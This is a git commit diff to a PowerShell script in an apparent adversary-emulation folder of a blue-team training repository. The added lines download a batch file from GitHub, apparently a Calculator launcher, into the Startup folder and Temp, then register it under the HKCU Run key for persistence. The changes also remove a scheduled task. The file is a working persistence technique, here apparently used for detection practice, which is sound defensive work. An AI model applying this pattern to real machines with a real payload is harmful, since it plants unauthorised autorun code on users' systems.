d9e7571efae81f4693104605f97d76808a490c5e
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-09-04 13:10:08 -0700

    Update establishPersistence.ps1

--- Adversary Emulation/establishPersistence.ps1
+++ Adversary Emulation/establishPersistence.ps1
@@ -1,4 +1,14 @@
+# StartUp Folder Persistence
 Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"
+
+# Run Key Persistence
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$keyName = "Persistence"
+Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
+$calcPath = "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
+Set-ItemProperty -Path $registryPath -Name $keyName -Value $calcPath
 
 # Delete Scheduled Task
 Unregister-ScheduledTask -TaskName "updater" -Confirm:$false
+
+
